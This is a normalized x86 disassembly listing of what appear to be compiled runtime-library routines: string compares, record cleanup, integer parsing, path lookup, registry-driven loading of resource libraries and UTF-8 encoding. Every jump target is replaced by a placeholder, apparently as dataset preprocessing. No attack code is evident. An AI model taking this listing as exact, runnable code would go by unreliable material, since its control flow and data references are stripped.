ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4047fc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_40476c
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4046ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404848
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4045f0
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4045d8
mov ebx eax
mov eax [ edi ]
call sub_40476c
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028d8
mov eax esi
sub_40488c
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_4048bc
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_4048bc
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_4048bc
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_40488c
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404950
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_40499c
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_40499c
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_403f44
jmp r-xdata
call sub_403f20
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404618
jmp r-xdata
call sub_404600
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404984
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_40499c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404950
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_40578c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_4050e0
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402838
sub_404aac
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028d8
mov edx [ eax + esi ]
add eax ebx
call sub_403f74
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_40463c
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404a94
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028d8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404bc8
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404aac
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4057a4
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40511c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404bc8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_403f74
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40463c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404a94
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404bc8
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404aac
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4057a4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40511c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402838
sub_404cc4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404ce8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402918
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402918
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404cc4
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_404f48
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404f40
jmp r-xdata
mov al 0x4
call sub_402838
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402838
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40271c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026dc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402ba4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_40499c
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028d8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402ba4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404f28
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404f48
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_4050e0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026fc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_40499c
sub_40511c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_4050e0
pop edx
pop eax
sub_405144
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012ec
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405174
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40127c
mov eax esp
mov dl 0x1
call sub_4053b0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4051bc
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405174
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4051f8
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401284
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40128c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4051e4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4051e4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4051e4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4053b0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40127c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012d4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4054b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4051f8
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012d4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012cc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012d4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40129c
push eax
call sub_401274
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405650
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026fc
jmp r-xdata
sub_4056b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4056eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_40571c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405780
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4056b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405787
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4057a4
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4057d0
test edx edx
je sub_40578c
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402838
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405874
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_40589c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405978
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
